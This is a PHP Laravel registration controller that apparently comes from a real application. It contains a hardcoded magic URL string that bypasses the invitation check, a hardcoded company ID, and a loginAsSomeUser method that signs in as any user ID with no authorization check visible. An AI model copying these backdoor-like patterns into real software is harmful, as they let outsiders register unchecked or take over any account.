<?php

namespace Modules\Register\Http\Controllers;

use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Modules\Core\Entities\Company;
use Modules\Core\Entities\Invitation;
use Modules\Core\Entities\User;
use Illuminate\Routing\Controller;
use Modules\Core\Services\FoxUtils;
use Vinkla\Hashids\Facades\Hashids;
use Modules\Core\Services\SendgridService;
use Modules\Core\Services\DigitalOceanFileService;
use Modules\Register\Http\Requests\RegisterRequest;

class RegisterController extends Controller
{
    public function create(Request $request)
    {
        if($request->segment(2) == 'nw2usr3cfx') {
            return view('register::create');
        }
        $companyId = current(Hashids::decode($request->segment(2)));
        if (!empty($companyId)) {
            $invitation = Invitation::where(['company_id' => $companyId])->first();
            if (!empty($invitation) && $invitation->company_id == 22) {
                return view('register::create');
            } else {
                return view('register::notInvite');
            }
        } else {
            return view('register::notInvite');
        }

    }

    public function loginAsSomeUser($userId)
    {

        auth()->loginUsingId($userId);

        return response()->redirectTo('/dashboard');
    }
}


